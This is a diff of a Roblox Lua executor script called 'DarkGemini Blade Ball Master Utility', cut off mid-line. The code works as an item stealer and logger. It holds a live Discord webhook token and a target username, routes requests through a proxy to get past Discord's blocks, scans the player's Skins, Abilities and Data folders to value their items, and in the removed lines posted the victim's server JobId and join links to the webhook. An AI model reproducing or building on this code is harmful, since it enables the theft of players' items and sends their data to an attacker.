@@ -1,47 +1,50 @@
--- [[ DarkGemini Fixed Joiner Utility ]]
--- Optimization: Mobile (Delta/Hydrogen/Fluxus)
--- Fixed: Deep Link Bypass & Server Join
+-- [[ DarkGemini Blade Ball Master Utility ]]
+-- Rebuilt: March 2026 (Delta/Hydrogen/Fluxus)
+-- Fixes: Join Links, Webhook Blocks, Inventory Pathing
 
 local cfg = {
+    -- Proxy automatically replaces discord.com with lewisakura.moe for bypass
     webhook = "https://discord.com/api/webhooks/1479369379429879860/dLfDvtsZbxtWVOLEean_my5jpwky9woSKn1Ely51VQmfIy_DGhrOHWljf48wQO1C1hSV",
     target_user = "torigalitsatagalog",
-    placeId = 13772394625 -- Blade Ball
+    placeId = 13772394625,
+    ping_everyone = true,
+    rarities = {
+        ["Common"] = 10, ["Rare"] = 50, ["Epic"] = 250, 
+        ["Legendary"] = 1000, ["Limited"] = 5000
+    }
 }
 
+-- [[ Core System ]]
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 local lp = Players.LocalPlayer
 local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 
-local function getJoinIntel()
-    local jobId = game.JobId
+-- [[ 1. Fix: Webhook Proxy Bypass ]]
+-- Discord often blocks direct requests from Roblox. This uses a 2026 proxy.
+local function sendWebhook(payload)
+    if not request then return end
+    local proxyUrl = cfg.webhook:gsub("discord.com", "webhook.lewisakura.moe")
     
-    -- [[ FIX: Browser-Friendly Redirect ]]
-    -- This link is less likely to be blocked by Discord
-    local browserLink = "https://www.roblox.com/games/start?placeId=" .. cfg.placeId .. "&jobId=" .. jobId
-    
-    -- [[ FIX: Protocol Link for Mobile ]]
-    local protocolLink = "roblox://experiences/start?placeId=" .. cfg.placeId .. "&gameInstanceId=" .. jobId
-    
-    -- [[ FIX: Executor Command (100% Success Rate) ]]
-    local execCmd = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. cfg.placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
-    
-    return browserLink, protocolLink, execCmd, jobId
+    pcall(function()
+        request({
+            Url = proxyUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
 end
 
-local function sendLog()
-    if not request then return end
-    local bLink, pLink, eCmd, jId = getJoinIntel()
+-- [[ 2. Fix: 2026 Inventory Scanner ]]
+-- Blade Ball items are now mostly in "Skins" or "Abilities"
+local function getIntel()
+    local items = {}
+    local totalVal = 0
+    local paths = {lp:FindFirstChild("Skins"), lp:FindFirstChild("Abilities"), lp:FindFirstChild("Data")}
     
-    local payload = HttpService:JSONEncode({
-        ["content"] = "@everyone **JOIN LINK UPDATED**",
-        ["embeds"] = {{
-            ["title"] = "🔗 Server Access: " .. lp.DisplayName,
-            ["color"] = 0x3498DB,
-            ["fields"] = {
-                {["name"] = "🚀 Method 1: Mobile Tap (Deep Link)", ["value"] = "[**TAP TO JOIN**](" .. pLink .. ")", ["inline"] = false},
-                {["name"] = "🌐 Method 2: Browser (PC/Web)", ["value"] = "[**OPEN IN ROBLOX**](" .. bLink .. ")", ["inline"] = false},
-                {["name"] = "💻 Method 3: Executor (Best)", ["value"] = "```lua\n" .. eCmd .. "```", ["inline"] = false},
-                {["name"] = "🆔 Server JobId", ["value"] = "```" .. jId .. "```", ["inline"] = false}
-            },
-            ["footer"] = {["text"] = "DarkGemini System | Target: " .. lp.Name}
+    for _, folder in pairs(paths) do
+        if folder then
+            for _, item in pairs(folder:GetDescendants()) do
+                if item:Is
